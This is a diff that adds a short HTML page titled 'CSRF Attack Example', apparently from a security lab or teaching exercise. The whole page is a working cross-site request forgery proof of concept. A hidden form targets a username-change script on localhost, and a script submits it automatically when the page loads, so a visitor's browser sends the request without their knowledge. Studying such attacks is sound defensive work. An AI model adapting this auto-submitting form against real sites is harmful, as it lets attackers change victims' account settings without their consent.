@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Example</title>
+</head>
+<body>
+    <!-- The action URL points to the script that processes the username update -->
+    <form id="csrfForm" action="http://localhost:8000/change_username.php" method="post">
+        <input type="hidden" name="change_username" value="Change Username">
+    </form>
+    <script>
+        // Automatically submit the form when the page loads
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
